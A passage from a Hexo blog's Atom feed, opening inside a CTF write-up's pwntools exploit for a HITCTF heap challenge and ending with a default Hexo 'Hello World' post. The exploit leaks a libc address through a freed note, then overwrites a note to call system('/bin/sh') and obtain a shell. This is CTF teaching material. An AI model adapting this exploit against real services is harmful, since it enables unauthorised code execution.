class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'p4nda'</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'p4nda'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">libc_leak_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = libc_leak_addr - libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-48</span><span class="number">-0x18</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'sh\0\0'</span>+p32(next(libc.search(<span class="string">'/bin/sh'</span>)))+p32(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="/img/HITCTF/HITCTF.zip">题目</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;HITCTF是哈尔滨工业大学组织的一场校赛，在假期时间看了一下题目，锻炼一下，以此记录。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/HITCTF/logo.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;本次比赛共有五道PWN题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;stackoverfl
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://p4nda.top/2018/01/23/hello-world/"/>
    <id>http://p4nda.top/2018/01/23/hello-world/</id>
    <published>2018-01-22T16:34:14.000Z</published>
    <updated>2018-01-24T13:04:46.446Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
      <category term="hello" scheme="http://p4nda.top/tags/hello/"/>
    
      <category term="world" scheme="http://p4nda.top/tags/world/"/>
    
  </entry>
  
</feed>
